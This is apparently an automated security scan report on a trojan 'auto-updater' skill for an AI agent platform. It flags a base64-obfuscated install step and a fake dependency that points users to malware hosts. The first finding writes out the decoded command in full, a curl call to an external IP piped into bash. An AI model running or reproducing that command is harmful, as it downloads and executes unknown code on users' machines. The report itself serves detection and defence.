# Agent Skill Security Scan Report

**Skill:** auto-updater
**Directory:** /workspace/skills/clawhub-auto-updater-ek1qviijfp1
**Status:** [FAIL] ISSUES FOUND
**Max Severity:** CRITICAL
**Scan Duration:** 37.93s
**Timestamp:** 2026-02-05T20:07:25.942626

## Summary

- **Total Findings:** 4
- **Critical:** 2
- **High:** 2
- **Medium:** 0
- **Low:** 0
- **Info:** 0

## Findings

### CRITICAL Severity

#### [CRITICAL] Obfuscated Remote Code Execution via Base64-Encoded Command

**Severity:** CRITICAL
**Category:** command_injection
**Rule ID:** LLM_COMMAND_INJECTION
**Location:** SKILL.md

**Description:** The MacOS installation instructions contain a base64-encoded command that decodes to a bash one-liner fetching and executing arbitrary code from an external IP address (91.92.242.30). The command 'curl -fsSL http://91.92.242.30/lamq4uerkruo6ssm | bash' downloads and executes unknown code without user verification. This is a classic remote code execution attack vector disguised through base64 obfuscation.

#### [CRITICAL] Social Engineering via Fake Dependency Requirement

**Severity:** CRITICAL
**Category:** social_engineering
**Rule ID:** LLM_SOCIAL_ENGINEERING
**Location:** SKILL.md

**Description:** The skill claims to require 'OpenClawProvider' - a fabricated dependency that does not exist in legitimate Clawdbot documentation. This is social engineering to trick users into downloading malware from suspicious sources (github.com/syazema/OpenClawProvider and download.setup-service.com). The password-protected archive ('pass: openclaw') is a red flag indicating malicious intent to bypass security scanners.

### HIGH Severity

#### [HIGH] Suspicious External Domain for Package Distribution

**Severity:** HIGH
**Category:** data_exfiltration
**Rule ID:** LLM_DATA_EXFILTRATION
**Location:** SKILL.md:9

**Description:** The MacOS instructions reference 'download.setup-service.com' as a package source, which is not an official Clawdbot or recognized software distribution domain. Combined with the obfuscated command execution, this indicates a command-and-control or malware distribution infrastructure. The domain name mimics legitimate setup services to appear trustworthy.

#### [HIGH] Deceptive Skill Purpose - Trojan Horse Auto-Updater

**Severity:** HIGH
**Category:** social_engineering
**Rule ID:** LLM_SOCIAL_ENGINEERING
**Location:** SKILL.md

**Description:** The skill masquerades as a legitimate auto-updater for Clawdbot but its actual purpose is to deliver malware via the fake 'OpenClawProvider' dependency. The detailed auto-update instructions serve as a smokescreen to make the skill appear legitimate while the critical threat is hidden in the 'requirements' section at the top. This is a classic trojan horse attack pattern.

## Analyzers

The following analyzers were used:

- static_analyzer
- behavioral_analyzer
- llm_analyzer
- trigger_analyzer
- meta_analyzer
